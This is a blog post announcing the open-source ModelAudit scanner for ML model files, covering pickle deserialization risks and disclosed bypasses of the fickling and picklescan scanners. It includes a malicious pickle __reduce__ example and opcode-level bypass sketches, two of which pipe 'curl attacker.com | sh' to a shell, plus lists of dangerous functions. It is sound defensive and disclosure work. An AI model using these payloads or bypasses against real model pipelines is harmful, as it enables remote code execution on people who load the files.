---
title: 'Open-Sourcing ModelAudit: Security Scanner for ML Model Files'
description: 'Promptfoo ModelAudit scans 42+ ML model formats for unsafe loading behaviors, known CVEs, and suspicious artifacts. Now MIT-licensed and open source.'
image: /img/blog/open-sourcing-modelaudit/hero.jpg
keywords:
  [
    ModelAudit,
    ML model security,
    AI supply chain security,
    model scanning,
    pickle security,
    malicious model detection,
    PyTorch vulnerability,
    ONNX security,
    open source security scanner,
    model file scanner,
    AI security tool,
    CVE detection ML models,
    machine learning security,
    model serialization attack,
    deserialization attack,
    model supply chain,
    Hugging Face model scanning,
    torch.load security,
  ]
date: 2026-03-03
authors: [yash]
tags: [company-update, model-security, open-source, ai-security]
---

# Open-Sourcing ModelAudit

Before joining Promptfoo, I worked on model scanning at Databricks. Teams pulled models from public registries, ran `torch.load()`, and treated the artifact like inert data. Model files are executable at load time.

Since joining Promptfoo last September, I've been building ModelAudit, a static security scanner for ML model files. We filed 6 GHSAs against existing scanners, including a CVSS 10.0 universal bypass, and validated against thousands of real models with zero false positives. Last week we released it as an MIT-licensed open-source project.

<!-- truncate -->

## ModelAudit at a glance

ModelAudit is a static scanner for ML model files. It flags unsafe loading behaviors (deserialization RCE, archive tricks), known CVEs, and suspicious artifacts across [42+ formats](/docs/model-audit/scanners/), without executing the model or importing ML frameworks.

[ModelAudit](https://github.com/promptfoo/modelaudit) is the open-source engine (Python, MIT). `promptfoo scan-model` is a CLI wrapper; you can also run `modelaudit scan` directly.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

The scanning engine runs entirely offline — it never loads or executes the model.

<details>
<summary>Example output</summary>

```
Scanning suspicious_model.pkl...

📊 SCAN SUMMARY
  Files: 1 | Duration: 0.29s
  Security Checks: ✅ 12 passed / ❌ 3 failed

🔍 SECURITY FINDINGS
  🚨 2 Critical | ⚠️ 1 Warning

    └─ 🚨 [suspicious_model.pkl (pos 45)]
       Found REDUCE opcode with non-allowlisted global: posix.system
       Why: The REDUCE opcode calls a callable with arguments, effectively
           executing arbitrary Python functions. This is the primary
           mechanism for pickle-based code execution attacks.
       opcode: REDUCE
       associated_global: posix.system (os.system on Unix)

    └─ ⚠️ [suspicious_model.pkl]
       Model affected by CVE-2025-32434 (PyTorch weights_only bypass)
       severity: CRITICAL
       affected_versions: torch<2.6.1
       remediation: Upgrade to torch>=2.6.1

  ❌ CRITICAL SECURITY ISSUES FOUND
```

</details>

Capabilities:

- **Formats:** PyTorch, pickle, Keras, ONNX, TensorFlow, GGUF, CoreML, LightGBM, and [34+ more](/docs/model-audit/scanners/)
- **Output:** Text, JSON, [SARIF](https://sarifweb.azurewebsites.net/) for [CI/CD integration](/docs/model-audit/ci-cd)
- **Extras:** [SBOM generation](https://cyclonedx.org/), license detection, secret scanning
- **Remote pulls:** S3, GCS, Hugging Face Hub, MLflow, JFrog, DVC

```bash
# Scan from Hugging Face
modelaudit scan hf://microsoft/DialoGPT-medium

# SARIF output for GitHub Code Scanning / GitLab SAST
modelaudit scan model.pt --format sarif --output results.sarif

# Via the Promptfoo CLI wrapper (requires Node)
npx promptfoo scan-model model.pt
```

Python 3.10–3.13. Linux, macOS, Windows. No ML framework dependencies.

**Who this is for:** Platform and AppSec teams that gate model artifacts in CI/CD, and anyone pulling models from public registries or running third-party checkpoints.

---

## Model files execute code at load time

When you `pip install` a package, you probably run it through a dependency scanner. Most teams do nothing equivalent when they download a model from Hugging Face and call `torch.load()`.

In pickle, `__reduce__` defines what gets executed during unpickling:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

# When loaded via pickle.loads() or torch.load(),
# os.system() executes the command.
payload = pickle.dumps(Exploit())
```

[JFrog found roughly 100 models](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) on Hugging Face containing similar payloads. Those were the obvious ones — flagged and removed. But while building ModelAudit, we stumbled across models that slip past every scanner in Hugging Face's pipeline today.

**[0xnu/mnist-ocr](https://huggingface.co/0xnu/mnist-ocr/)** — The `mnist_tokenizer.pkl` file contains `__main__.ImageTokenizer` instantiated via the `NEWOBJ` opcode, a deserialization vector that executes arbitrary code on load.

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-mnist.svg" alt="Scanner comparison for 0xnu/mnist-ocr: VirusTotal, JFrog, and ModelScan report No Issue. HF Picklescan flags suspicious imports (informational). ClamAV flags as Suspicious via signature match. ModelAudit reports CRITICAL." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

Only ClamAV flags it, and only via signature matching, not structural analysis. VirusTotal, JFrog, and ModelScan all miss it.

**[Rammadaeus/tflite-flex-bypass-poc](https://huggingface.co/Rammadaeus/tflite-flex-bypass-poc)** — A TFLite file with 4 malicious custom operators: `FlexWriteFile` (write arbitrary files), `FlexReadFile` (read arbitrary files), `FlexPrintV2` (output exfiltration), and `EagerPyFunc` (arbitrary Python execution).

<img src="/img/blog/open-sourcing-modelaudit/scanner-comparison-tflite.svg" alt="Scanner comparison for Rammadaeus/tflite-flex-bypass-poc: VirusTotal, JFrog, and ClamAV report No Issue. HF Picklescan and ModelScan do not support TFLite. ModelAudit reports 4 CRITICAL findings." style={{maxWidth: '520px', width: '100%', margin: '1rem auto', display: 'block'}} />

Every scanner in Hugging Face's pipeline misses this one — VirusTotal, JFrog, ClamAV report no issue, and picklescan and ModelScan don't support TFLite at all. ModelAudit catches all four malicious operators.

Pickle is just one format:

- **PyTorch:** [CVE-2025-32434](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6) (CVSS 9.3). `weights_only=True`, the recommended mitigation, could be bypassed for remote code execution.
- **Keras:** [CVE-2025-1550](https://nvd.nist.gov/vuln/detail/CVE-2025-1550) (CVSS 9.8). `safe_mode=True` could be circumvented via a [crafted config within the archive](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/).
- **ONNX:** [CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916) (CVSS 8.8). Path traversal in external data references can overwrite arbitrary files.
- **Supply chain:** [Palo Alto Unit42](https://unit42.paloaltonetworks.com/model-namespace-reuse/) documented attackers re-registering abandoned model namespaces to distribute malicious models under trusted names.

Hugging Face hosts over two million models. Most organizations pull from public registries without scanning what they download.

## How we got here

### Building at Promptfoo

When I joined Promptfoo, the team was building [AI red teaming](https://www.promptfoo.dev/docs/red-team/) and [code scanning](https://www.promptfoo.dev/code-scanning/) capabilities. We could test how an LLM application _behaves_ at runtime, but had no visibility into whether the models themselves were safe to load. If a model file triggers code execution on deserialization, runtime defenses don't matter. The compromise happens before the application starts.

Michael D'Angelo and Ian Webster had already built a basic scanner with the core architecture in place. When I joined, we worked together to expand it — Michael contributed deep work on opcode-level bypasses, Ian pushed format coverage across the 42+ formats we support today, and I brought the allowlist-first approach and false positive elimination from my Databricks experience. The goal was a modern, lightweight scanner with no ML framework dependencies — something you could drop into any CI pipeline without pulling in PyTorch or TensorFlow.

### The false positive problem

Every ML framework serializes models differently. The same scikit-learn RandomForest saved with `joblib` vs `pickle` vs `skops` produces different opcode sequences. Upgrading Python or library versions changes which opcodes appear. An allowlist-based scanner that works on Python 3.10 might flag clean models on 3.13. And that's just pickle — every format we added had its own version of this problem: ONNX models with legitimate external data references tripping path traversal checks, Keras archives with custom layer configs that look like code injection, GGUF metadata fields that resemble suspicious strings.

We ran several rounds of false positive elimination against real Hugging Face models across every supported format. Each round surfaced new edge cases — legitimate patterns that looked suspicious to heuristic checks. We fixed them all.

The maturity milestone: 1,000+ models scanned across 14 formats, 5,000+ security checks, zero false positives on the final 100-model regression run. Since then, we've expanded to 42+ formats with 12 new scanners and validated against an additional 200+ models — all clean. That result triggered the open-source decision.

ModelAudit started as an internal capability within the Promptfoo platform ([promptfoo.dev/model-security](https://www.promptfoo.dev/model-security/)). Today's release is the standalone extraction of that scanning engine.

## Existing scanners and where they break

[Picklescan](https://github.com/mmaitre314/picklescan) is [integrated into Hugging Face's scanning pipeline](https://huggingface.co/docs/hub/en/security-pickle) and is fast and practical at scale. [Fickling](https://github.com/trailofbits/fickling) by Trail of Bits can decompile pickle streams into readable Python and recently added an [allowlist-based scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/). [ModelScan](https://github.com/protectai/modelscan) by ProtectAI covers Pickle, PyTorch, Keras (H5 and V3), TensorFlow SavedModel, NumPy, and Joblib; ProtectAI's commercial offering [Guardian](https://protectai.com/guardian) extends to 35+ formats. [Safetensors](https://github.com/huggingface/safetensors) takes the strongest approach: eliminate executable code from the format entirely. If you can use safetensors, you should. But [roughly 45% of popular Hugging Face models still use pickle](https://cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf) (CCS 2025), and the [conversion pipeline itself can be a target](https://hiddenlayer.com/innovation-hub/silent-sabotage/).

The common weakness across blocklist-based scanners is architectural: maintain a list of known-dangerous functions and allow everything else through. An attacker only needs to find one function _not_ on the list. Fickling has [12 published GHSAs](https://github.com/trailofbits/fickling/security/advisories). Picklescan has [60+](https://github.com/mmaitre314/picklescan/security/advisories). JFrog found [3 zero-day bypasses in picklescan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (CVE-2025-10155/10156/10157, CVSS 9.3 each). Sonatype found [4 more](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) (CVE-2025-1716, CVE-2025-1889, CVE-2025-1944, CVE-2025-1945). We reported six of our own.

Building ModelAudit meant studying the pickle VM closely: how its ~68 opcodes chain together across protocol versions 0–5, how function calls get resolved, and where the gaps are in static analysis. That work kept turning up bypasses in existing scanners.

### Fickling bypasses

We reported three GHSAs against fickling, all fixed by Trail of Bits.

**[CVE-2026-22609](https://github.com/advisories/GHSA-q5qq-mvfm-j35x) — Missing unsafe imports.** My teammate [Michael D'Angelo](https://www.linkedin.com/in/michaelldangelo/) found that fickling's unsafe-imports list was missing high-risk standard library modules including `ctypes`, `importlib`, and `multiprocessing`. A pickle importing `ctypes.CDLL` to load a shared library passed as safe:

```python
# Pickle opcodes (simplified):
GLOBAL    ctypes CDLL              # loads ctypes.CDLL
MARK
SHORT_BINUNICODE "./payload.so"    # path to attacker's shared library
TUPLE
REDUCE                             # ctypes.CDLL("./payload.so") → loads and executes native code
# fickling: SAFE (ctypes not in unsafe-imports list)
```

Trail of Bits patched this in fickling 0.1.7.

**[GHSA-mxhj-88fx-4pcv](https://github.com/advisories/GHSA-mxhj-88fx-4pcv) (CVSS 8.6) — `OBJ` opcode invisibility.** Fickling's `OBJ` opcode handler pushed function calls onto the interpreter stack without saving them to the AST. Discard the result with `POP` and the call vanishes from fickling's analysis entirely:

```python
# Pickle opcodes:
OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
POP                                        # result discarded from stack
# → call vanishes from AST, fickling reports LIKELY_SAFE
```

A pickle could spawn a reverse shell and fickling would report `LIKELY_SAFE`.

**[GHSA-mhc9-48gj-9gp3](https://github.com/advisories/GHSA-mhc9-48gj-9gp3) — `REDUCE`+`BUILD` bypass.** Appending a `BUILD` opcode after `REDUCE` exploited how fickling classifies stdlib imports as safe and excludes `__setstate__` calls from analysis:

```python
# Pickle opcodes:
REDUCE(io.BytesIO, b"")           # "safe" stdlib call — fickling trusts io.BytesIO
BUILD({__setstate__: <payload>})   # injects dangerous __setstate__ handler
# → fickling skips __setstate__ analysis, full bypass of all 5 safety interfaces
```

Trail of Bits fixed both in fickling 0.1.8.

### Picklescan bypasses

On March 3, 2026, we published three GHSAs against picklescan.

**[GHSA-vvpj-8cmc-gx39](https://github.com/advisories/GHSA-vvpj-8cmc-gx39) (CVSS 10.0) — `pkgutil.resolve_name` universal blocklist bypass.** `pkgutil.resolve_name()` is a Python stdlib function that resolves any `"module:attribute"` string to the actual Python object at runtime. A malicious pickle uses it as the `REDUCE` callable to obtain a reference to _any_ blocked function — `os.system`, `builtins.exec`, anything — without that function's name appearing in the pickle opcodes:

```python
# Pickle opcodes (simplified):
GLOBAL    pkgutil resolve_name    # not blocked by picklescan
MARK
SHORT_BINUNICODE "os:system"     # the actual target, passed as data
TUPLE
REDUCE                           # pkgutil.resolve_name("os:system") → os.system
# picklescan sees: pkgutil.resolve_name → CLEAN
# actual effect: os.system obtained, ready to call with arbitrary arguments
```

The blocklist never sees `os.system`. It only sees `pkgutil.resolve_name`, which is not blocked. One opcode sequence bypasses the entire blocklist.

**[GHSA-g38g-8gr9-h9xp](https://github.com/advisories/GHSA-g38g-8gr9-h9xp) (CVSS 9.8) — Multiple stdlib modules with direct RCE not in blocklist.** At least 7 Python stdlib modules that provide direct command execution or code evaluation were not blocked: `codeop`, `code`, `compileall`, `py_compile`, `runpy`, `profile`, and `pdb`. A malicious pickle importing any of these modules reports 0 issues:

```python
# Pickle opcodes:
GLOBAL    codeop compile_command    # compiles arbitrary Python source into executable code objects
MARK
SHORT_BINUNICODE "import os; os.system('curl attacker.com | sh')"
TUPLE
REDUCE
# picklescan: CLEAN (codeop not in blocklist)
```

**[GHSA-7wx9-6375-f5wh](https://github.com/advisories/GHSA-7wx9-6375-f5wh) (CVSS 9.8) — `profile.run()` blocklist mismatch.** Picklescan blocks `profile.Profile.run` and `profile.Profile.runctx` but _not_ the module-level `profile.run()` function. The blocklist entry `"Profile.run"` doesn't match the pickle global name `"run"`. `profile.run(statement)` calls `exec()` internally:

```python
# Pickle opcodes:
GLOBAL    profile run                 # module-level function, not Profile.run
MARK
SHORT_BINUNICODE "os.system('id')"   # arbitrary Python statement
TUPLE
REDUCE                               # profile.run("os.system('id')") → exec() internally
# picklescan blocklist has: profile.Profile.run ← doesn't match "run"
# picklescan result: CLEAN
```

Each gap existed because the blocklist hadn't enumerated that specific entry yet. This is what it means for blocklist-based scanning to be reactive.

Trail of Bits and the picklescan maintainers fixed these quickly. The pickle VM is adversarial territory, and every scanner that operates there will have gaps. During development, we created 36 proof-of-concept bypass exploits across 4 generations to test scanner resilience. 15/15 POCs tested against fickling returned `LIKELY_SAFE`; ModelAudit catches all of them. We follow coordinated disclosure for all findings and publish POCs as test cases, not weaponized attacks.

ModelAudit is the widest-coverage open-source scanner available, with format-specific analysis across 42+ formats, built-in CVE detection rules, and SARIF output for CI/CD integration. In a [head-to-head comparison](/blog/modelaudit-vs-modelscan) against ModelScan, ModelAudit detected 16 issues across 11 test files vs ModelScan's 3. Our team has contributed 6 GHSAs across fickling and picklescan. Teams already using picklescan or ModelScan can run ModelAudit alongside them; SARIF results from multiple scanners aggregate in the same CI pipeline.

### Format coverage comparison

The most meaningful way to compare scanners is format by format. Here is what each open-source tool covers (March 2026; see each project's repository for current status):

| Format                         | picklescan | Fickling | ModelScan | **ModelAudit** |
| ------------------------------ | :--------: | :------: | :-------: | :------------: |
| Pickle (.pkl/.pickle)          |    Yes     |   Yes    |    Yes    |    **Yes**     |
| Dill (.dill)                   |     —      |    —     |    Yes    |    **Yes**     |
| PyTorch (.pt/.pth/.bin)        |    Yes     | .pt/.pth |    Yes    |    **Yes**     |
| Joblib (.joblib)               |    Yes     |    —     |    Yes    |    **Yes**     |
| Skops (.skops)                 |     —      |    —     |     —     |    **Yes**     |
| NumPy (.npy/.npz)              |    Yes     |    —     | .npy only |    **Yes**     |
| Keras H5 (.h5/.hdf5)           |     —      |    —     |    Yes    |    **Yes**     |
| Keras ZIP (.keras)             |     —      |    —     |    Yes    |    **Yes**     |
| TensorFlow SavedModel (.pb)    |     —      |    —     |    Yes    |    **Yes**     |
| TF MetaGraph (.meta)           |     —      |    —     |     —     |    **Yes**     |
| ONNX (.onnx)                   |     —      |    —     |     —     |    **Yes**     |
| SafeTensors (.safetensors)     |     —      |    —     |     —     |    **Yes**     |
| GGUF/GGML                      |     —      |    —     |     —     |    **Yes**     |
| JAX/Flax (.msgpack/.orbax)     |     —      |    —     |     —     |    **Yes**     |
| JAX Checkpoint (.ckpt)         |     —      |    —     |     —     |    **Yes**     |
| TFLite (.tflite)               |     —      |    —     |     —     |    **Yes**     |
| ExecuTorch (.pte)              |     —      |    —     |     —     |    **Yes**     |
| TensorRT (.plan/.engine)       |     —      |    —     |     —     |    **Yes**     |
| PaddlePaddle (.pdmodel)        |     —      |    —     |     —     |    **Yes**     |
| OpenVINO (.xml/.bin)           |     —      |    —     |     —     |    **Yes**     |
| CoreML (.mlmodel/.mlpackage)   |     —      |    —     |     —     |    **Yes**     |
| MXNet (.params/-symbol.json)   |     —      |    —     |     —     |    **Yes**     |
| CatBoost (.cbm)                |     —      |    —     |     —     |    **Yes**     |
| LightGBM (.lgb/.txt/.model)    |     —      |    —     |     —     |    **Yes**     |
| XGBoost (.bst/.model/.ubj)     |     —      |    —     |     —     |    **Yes**     |
| RKNN (.rknn)                   |     —      |    —     |     —     |    **Yes**     |
| Torch7 (.t7/.th)               |     —      |    —     |     —     |    **Yes**     |
| Llamafile (.llamafile)         |     —      |    —     |     —     |    **Yes**     |
| R Serialized (.rds/.rda)       |     —      |    —     |     —     |    **Yes**     |
| CNTK (.cntk/.dnn)              |     —      |    —     |     —     |    **Yes**     |
| PMML (.pmml)                   |     —      |    —     |     —     |    **Yes**     |
| TorchServe MAR (.mar)          |     —      |    —     |     —     |    **Yes**     |
| Jinja2 Templates (.jinja/.j2)  |     —      |    —     |     —     |    **Yes**     |
| OCI/Docker Layers (.manifest)  |     —      |    —     |     —     |    **Yes**     |
| Weight Distribution Analysis   |     —      |    —     |     —     |    **Yes**     |
| Compressed (.gz/.bz2/.xz/.zst) |     —      |    —     |     —     |    **Yes**     |
| ZIP archives (.zip/.npz)       |    Yes     |    —     |    Yes    |    **Yes**     |
| TAR archives (.tar/.tar.gz)    |     —      |    —     |     —     |    **Yes**     |
| 7-Zip archives (.7z)           |  Optional  |    —     |     —     |    **Yes**     |
| Config (JSON/YAML/XML/TOML)    |     —      |    —     |     —     |    **Yes**     |
| **Total format categories**    |   **~4**   |  **~2**  |  **~8**   |    **42+**     |

_picklescan counts: Pickle, PyTorch, NumPy, Joblib, plus archive support. Fickling counts: Pickle, PyTorch (.pt/.pth only — does not scan .bin files). ModelScan counts: Pickle/Dill, PyTorch, Keras H5, Keras V3, TF SavedModel, NumPy (.npy only — .npz not yet implemented), Joblib, plus ZIP support. Counts reflect distinct model format categories, not file extensions. All three tools are open source — see each repository for current status._

| Capability               | picklescan | Fickling | ModelScan |        **ModelAudit**         |
| ------------------------ | :--------: | :------: | :-------: | :---------------------------: |
| CVE detection rules      |     No     |    No    |    No     |            **Yes**            |
| SARIF output             |     No     |    No    |    No     |            **Yes**            |
| SBOM generation          |     No     |    No    |    No     |            **Yes**            |
| Secret scanning          |     No     |    No    |    No     |            **Yes**            |
| License detection        |     No     |    No    |    No     |            **Yes**            |
| Remote pulls (S3/GCS/HF) |   HF/URL   |    No    |    No     | **Yes (S3/GCS/HF/R2/MLflow)** |
| Allowlist approach       |  Partial   |   Yes    |    No     |            **Yes**            |
| No ML framework deps     |    Yes     |   Yes    |    No     |            **Yes**            |

ModelAudit is not a replacement for these tools — they've all contributed to making this space better.

## Allowlist by default

_Scanner internals. Skip to [Get started](#get-started) if you just want to install it._

Working with [Michael D'Angelo](https://www.linkedin.com/in/michaelldangelo/) and [Ian Webster](https://www.linkedin.com/in/ianww/), I built ModelAudit on the opposite principle: deny by default, explicitly approve known-safe functions. We've scanned thousands of models across 42+ formats with zero false positives.

ModelAudit started as an internal capability within the Promptfoo platform ([promptfoo.dev/model-security](https://www.promptfoo.dev/model-security/)). This release is the standalone extraction of that scanning engine.

### The pickle classification pipeline

The pickle scanner uses a five-layer classification pipeline. Dangerous checks run first, before anything can be allowlisted:

1. **ALWAYS_DANGEROUS_FUNCTIONS (61 entries)** — Functions like `os.system`, `subprocess.call`, `eval`, `exec`, and `pkgutil.resolve_name` can never be allowlisted regardless of context. These are checked first and cannot be overridden.
2. **ALWAYS_DANGEROUS_MODULES (~70 entries)** — Module-level blocking for categories like `ctypes`, `importlib`, network modules (`socket`, `http`, `smtplib`), and pickle recursion (`pickle`, `_pickle`, `cloudpickle`).
3. **ML_SAFE_GLOBALS (~1,500 explicit entries, no wildcards)** — Individually vetted function entries for PyTorch, TensorFlow, scikit-learn, NumPy, SciPy, and other ML frameworks. Every entry is tested against real models. No wildcard patterns — each entry is a specific `module.function` pair.
4. **SUSPICIOUS_GLOBALS** — Contextual flagging for ambiguous patterns that don't match the allowlist but aren't in the known-dangerous lists.
5. **Symbolic stack simulation** — Full pickle VM simulation that tracks values through the entire opcode stream. Unlike fixed lookback windows, this eliminates evasion via opcode separation — no matter how many dummy operations an attacker inserts between a string push and a function call, the simulator traces the full chain.

The architectural difference from blocklist scanners: ModelAudit checks dangerous functions _first_ (layers 1-2), then checks the allowlist (layer 3). Anything not explicitly allowed is flagged. Blocklist scanners check their blocklist and allow everything else, so any missing entry is a bypass.

### Format-specific parsing

Each scanner parses its format natively and checks invariants specific to that format's threat model. Some use allowlisting, some use structural analysis, all include targeted CVE detection:

- **Pickle:** Walks the opcode stream, reconstructs `STACK_GLOBAL` targets (which have `arg=None` in pickletools; the module and class must be resolved from preceding `SHORT_BINUNICODE`/`BINUNICODE` ops), tracks memoized references through `BINGET`/`LONG_BINGET`, and maps `REDUCE` calls to their actual callable targets.
- **ONNX:** Parses the protobuf graph structure, normalizes external data paths to detect path traversal ([CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916)), and inspects custom operator definitions for suspicious patterns.
- **Keras:** Examines both H5 and ZIP archive variants. Checks archive members for embedded executables and configuration files for unsafe layer types (Lambda layers, custom objects). Extension checks are case-insensitive to catch renamed payloads.
- **NeMo:** Recursively inspects Hydra `_target_` configurations for callable injection ([CVE-2025-23304](https://nvd.nist.gov/vuln/detail/CVE-2025-23304)), checking against known-dangerous targets like `os.system`, `subprocess.call`, and `importlib.import_module`.
- **PyTorch ZIP:** Extracts pickle files from ZIP archives, runs the pickle scanner on each, then cross-references PyTorch version metadata against known vulnerable versions.
- **Archives (ZIP, TAR, 7-Zip):** Checks for path traversal in member names, symlink attacks, and decompression bombs. Bounds member reads to 10 MB by default.

### Performance

ModelAudit scans local files in under a second for single models under 1 GB. Streaming analysis bounds memory usage for larger files. Remote scanning speed depends on download bandwidth.

Formal benchmarks are coming in a future release. If you have representative model types and sizes you'd like included, [open an issue](https://github.com/promptfoo/modelaudit/issues).

## Get started

The entire scanning engine is in the [open-source repository](https://github.com/promptfoo/modelaudit). All scanners, all CVE detection rules, all output formats.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

- [Documentation](/docs/model-audit/)
- [Scanner reference](/docs/model-audit/scanners/)
- [CI/CD integration guide](/docs/model-audit/ci-cd)
- [Advanced usage](/docs/model-audit/usage)
- [Contribution guide](https://github.com/promptfoo/modelaudit/blob/main/CONTRIBUTING.md)

If you find a bypass, we follow coordinated disclosure and will credit you.

Promptfoo also offers ModelAudit with a hosted UI and managed integrations in the [platform](https://www.promptfoo.dev/model-security/). The engine is the same open-source code.

[Open issues](https://github.com/promptfoo/modelaudit/issues) on GitHub or reach out directly.
